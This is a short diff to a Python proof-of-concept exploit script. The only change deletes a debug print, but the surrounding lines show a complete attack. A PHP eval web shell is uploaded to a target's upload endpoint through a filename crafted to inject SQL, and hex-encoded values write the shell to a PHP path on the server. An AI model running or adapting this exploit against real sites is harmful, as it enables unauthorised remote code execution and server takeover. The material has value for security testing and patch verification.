@@ -15,7 +15,6 @@ def poc():
 		phpshell = "<?php eval($_POST['" + password + "']);?>"
 		# phpshell = "<?php phpinfo(); ?>"
 		url1 = target.url + "?c=upload&f=save"
-		print url1
 		files1 = [('upfile', ("1','r7ip15ijku7jeu1s1qqnvo9gj0','30',''),('1',0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,'',0x7265732f746573742e706870,'1495536080','2.jpg",phpshell, 'image/jpg')),
 		]
 		r = requests.post(url1, files=files1, cookies=cookies)
